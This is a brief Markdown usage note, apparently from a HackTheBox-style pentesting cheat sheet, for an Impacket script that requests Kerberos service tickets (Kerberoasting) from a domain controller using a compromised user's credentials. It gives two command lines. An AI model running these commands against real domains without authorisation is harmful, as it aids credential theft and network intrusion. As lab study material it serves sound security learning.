## Purpose
This tool enables you to gain a TGS through the usage of credentials of another user in the DC you're trying to hack into

## Usage
Usage when you try to get a TGS through the usage of a previously pwned user
	GetUserSPN.py __{DOMAIN ex. active.htb}__/__{USER}__:__{PASSWORD}__
Usage when you have previously launched the attack succesfully and you want to get that TGS
	GetUserSPN.py __{DOMAIN ex. active.htb}__/__{USER}__:__{PASSWORD}__ -request